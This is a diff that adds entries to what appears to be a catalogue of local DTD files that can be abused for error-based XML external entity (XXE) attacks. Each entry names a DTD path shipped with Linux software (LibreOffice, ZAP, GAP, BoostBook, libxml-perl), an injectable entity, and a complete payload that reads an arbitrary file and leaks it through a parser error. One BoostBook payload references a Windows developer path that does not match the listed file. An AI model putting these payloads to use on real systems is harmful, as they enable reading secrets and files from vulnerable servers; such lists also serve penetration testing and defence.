@@ -769,3 +769,145 @@
 ]>
 <message></message>
 ```
+
+ ---
+
+**DTD File:** `/usr/lib/libreoffice/share/dtd/officedocument/1_0/accelerator.dtd`
+
+**Injectable entity:** `boolean`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/lib/libreoffice/share/dtd/officedocument/1_0/accelerator.dtd">
+
+    <!ENTITY % boolean '(aa) #IMPLIED>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ATTLIST attxx aa "bb"'>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+**DTD File:**
+ - `/usr/share/paros/xml/alert.dtd`
+ - `/usr/share/zaproxy/xml/alert.dtd`
+
+**Injectable entity:** `alertDef`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/zaproxy/xml/alert.dtd">
+
+    <!ENTITY % alertDef '
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        '>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+**DTD File:** `/usr/lib/gap/pkg/GAPDoc-1.6.2/bibxmlext.dtd`
+
+**Injectable entity:** `n.InProceedings`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/lib/gap/pkg/GAPDoc-1.6.2/bibxmlext.dtd">
+
+    <!ENTITY % n.InProceedings 'aaa)>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ELEMENT aa (bb'>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+**DTD File:** 
+ - `/usr/share/boostbook/dtd/1.1/boostbook.dtd`
+ - `/usr/share/boostbook/dtd/boostbook.dtd`
+
+**Injectable entity:** `boost.common.attrib`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///C:\Code\projects\dtd-finder\samples\new\boostbook.dtd">
+
+    <!ENTITY % boost.common.attrib '>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ELEMENT aa "bb"'>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+**DTD File:** `/usr/share/doc/libxml-libxml-perl/examples/complex/complex.dtd`
+
+**Injectable entity:** `f`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/doc/libxml-libxml-perl/examples/complex/complex.dtd">
+
+    <!ENTITY % f '
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        '>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+**DTD File:** `/usr/share/doc/libxml-libxml-perl/examples/complex/dtd/f.dtd`
+
+**Injectable entity:** `g`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/doc/libxml-libxml-perl/examples/complex/dtd/f.dtd">
+
+    <!ENTITY % g '
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        '>
+
+    %local_dtd;
+]>
+<message></message>
+```
